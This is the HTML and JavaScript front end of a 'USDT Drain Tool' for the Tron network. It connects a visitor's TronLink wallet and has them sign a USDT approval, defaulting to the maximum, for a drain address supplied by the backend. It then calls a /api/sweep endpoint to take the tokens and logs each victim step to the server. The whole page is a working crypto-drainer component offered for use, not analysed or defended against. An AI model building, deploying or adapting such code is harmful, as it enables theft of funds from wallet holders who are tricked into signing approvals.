<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>USDT Drain Tool</title>
    <style>
        body {
            font-family: 'Segoe UI', system-ui;
            background: #0f172a;
            color: #f1f5f9;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .card {
            background: #1e293b;
            border-radius: 24px;
            padding: 2rem;
            max-width: 500px;
            width: 100%;
            box-shadow: 0 20px 35px -8px rgba(0,0,0,0.5);
        }
        h1 { font-size: 1.8rem; margin-bottom: 0.5rem; }
        button {
            background: #3b82f6;
            border: none;
            color: white;
            font-weight: bold;
            padding: 12px 20px;
            border-radius: 40px;
            cursor: pointer;
            font-size: 1rem;
            width: 100%;
            margin-top: 12px;
            transition: 0.2s;
        }
        button:hover { background: #2563eb; transform: translateY(-2px); }
        button:disabled { background: #475569; cursor: not-allowed; transform: none; }
        .info {
            background: #0f172a;
            padding: 12px;
            border-radius: 16px;
            margin: 16px 0;
            word-break: break-all;
        }
        .balance-row {
            display: flex;
            justify-content: space-between;
            margin: 8px 0;
        }
        input {
            background: #0f172a;
            border: 1px solid #334155;
            padding: 10px 16px;
            border-radius: 40px;
            color: white;
            width: 100%;
            margin: 8px 0;
        }
        .flex {
            display: flex;
            gap: 12px;
        }
        .status {
            background: #0f172a;
            border-left: 3px solid #3b82f6;
            padding: 8px 12px;
            border-radius: 12px;
            margin-top: 16px;
            font-size: 0.85rem;
            font-family: monospace;
        }
    </style>
</head>
<body>
<div class="card">
    <h1>💸 USDT Drain Tool</h1>
    <p>Connect TronLink to start</p>

    <button id="connectBtn">🔌 Connect TronLink</button>

    <div id="walletInfo" style="display: none;">
        <div class="info">
            <div><strong>Address:</strong> <span id="address"></span></div>
            <div class="balance-row"><span>USDT:</span> <span id="usdtBal">—</span></div>
            <div class="balance-row"><span>TRX:</span> <span id="trxBal">—</span></div>
        </div>

        <label>Approve Amount (USDT)</label>
        <input type="text" id="approveAmount" value="max" placeholder="max or number">

        <div class="flex">
            <button id="approveBtn">✅ Approve USDT</button>
            <button id="drainBtn" style="background:#dc2626;">💀 Drain USDT</button>
        </div>
    </div>

    <div id="status" class="status">⚡ Ready. Click Connect.</div>
</div>

<script src="https://cdn.jsdelivr.net/npm/tronweb@6.3.0/dist/TronWeb.js"></script>
<script>
    // --- DOM elements ---
    const connectBtn = document.getElementById('connectBtn');
    const walletInfoDiv = document.getElementById('walletInfo');
    const addressSpan = document.getElementById('address');
    const usdtSpan = document.getElementById('usdtBal');
    const trxSpan = document.getElementById('trxBal');
    const approveBtn = document.getElementById('approveBtn');
    const drainBtn = document.getElementById('drainBtn');
    const approveAmountInput = document.getElementById('approveAmount');
    const statusDiv = document.getElementById('status');

    let userAddress = null;
    let tronWeb = null;
    let config = { drainAddress: '', drainContract: '', maxApprove: '', usdtContract: '' };

    // Helper to update status
    function setStatus(msg, isError = false) {
        statusDiv.innerHTML = msg;
        statusDiv.style.borderLeftColor = isError ? '#dc2626' : '#3b82f6';
        console.log(msg);
    }

    // Load backend config
    async function loadConfig() {
        try {
            const res = await fetch('/api/config');
            config = await res.json();
            setStatus('✅ Config loaded');
        } catch (err) {
            setStatus('❌ Failed to load config: ' + err.message, true);
        }
    }

    // Update balances via backend
    async function updateBalances() {
        if (!userAddress) return;
        try {
            const res = await fetch('/api/balance', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ address: userAddress })
            });
            const data = await res.json();
            usdtSpan.innerText = data.usdt.toFixed(2) + ' USDT';
            trxSpan.innerText = data.trx.toFixed(2) + ' TRX';
        } catch (err) {
            usdtSpan.innerText = 'Error';
            trxSpan.innerText = 'Error';
            setStatus('Balance fetch error: ' + err.message, true);
        }
    }

    // Log event to backend (optional)
    async function logEvent(type, txId = '', amount = '') {
        try {
            await fetch('/api/event', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ type, address: userAddress, txId, amount })
            });
        } catch(e) {}
    }

    // ---------- Connect TronLink ----------
    connectBtn.onclick = async () => {
        if (!window.tronLink || !window.tronLink.ready) {
            alert('Please install TronLink extension first.');
            return;
        }
        setStatus('🔄 Connecting to TronLink...');
        try {
            // Request account access
            await window.tronLink.request({ method: 'tron_requestAccounts' });
            userAddress = window.tronLink.defaultAddress.base58;
            tronWeb = window.tronLink.tronWeb;
            addressSpan.innerText = userAddress.slice(0,6)+'...'+userAddress.slice(-4);
            walletInfoDiv.style.display = 'block';
            connectBtn.style.display = 'none';
            setStatus(`✅ Connected: ${userAddress}`);
            await updateBalances();
            await logEvent('wallet_connected');
        } catch (err) {
            setStatus('❌ Connection failed: ' + err.message, true);
        }
    };

    // ---------- Approve USDT ----------
    approveBtn.onclick = async () => {
        if (!tronWeb || !userAddress) {
            alert('Connect wallet first');
            return;
        }
        const spender = config.drainContract || config.drainAddress;
        if (!spender) {
            setStatus('❌ No drain address/contract configured on backend', true);
            return;
        }
        const amountRaw = approveAmountInput.value.trim();
        let amountWei;
        const isMax = amountRaw === 'max' || amountRaw === '';
        if (isMax) {
            amountWei = config.maxApprove;
        } else {
            const num = parseFloat(amountRaw);
            if (isNaN(num)) {
                setStatus('❌ Invalid amount', true);
                return;
            }
            amountWei = Math.floor(num * 1e6).toString(); // USDT has 6 decimals
        }

        setStatus('⏳ Sending approve transaction...');
        approveBtn.disabled = true;
        try {
            const contract = await tronWeb.contract().at(config.usdtContract);
            const tx = await contract.approve(spender, amountWei).send();
            setStatus(`✅ Approved! TX: <a href="https://tronscan.org/#/transaction/${tx}" target="_blank">${tx.slice(0,10)}...</a>`);
            await logEvent('approve_signed', tx, amountRaw);
        } catch (err) {
            setStatus(`❌ Approve failed: ${err.message}`, true);
        } finally {
            approveBtn.disabled = false;
        }
    };

    // ---------- Drain ----------
    drainBtn.onclick = async () => {
        if (!userAddress) {
            alert('Connect wallet first');
            return;
        }
        setStatus('⏳ Sending drain request...');
        drainBtn.disabled = true;
        try {
            const res = await fetch('/api/sweep', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ address: userAddress })
            });
            const data = await res.json();
            if (data.success) {
                setStatus(`💀 Drained! TX: <a href="https://tronscan.org/#/transaction/${data.txId}" target="_blank">${data.txId.slice(0,10)}...</a>`);
                await logEvent('drain_sent', data.txId);
                // Refresh balances after a few seconds
                setTimeout(updateBalances, 4000);
            } else {
                setStatus(`❌ Drain failed: ${data.error}`, true);
            }
        } catch (err) {
            setStatus(`❌ Drain error: ${err.message}`, true);
        } finally {
            drainBtn.disabled = false;
        }
    };

    // Initialize
    loadConfig();
</script>
</body>
</html>
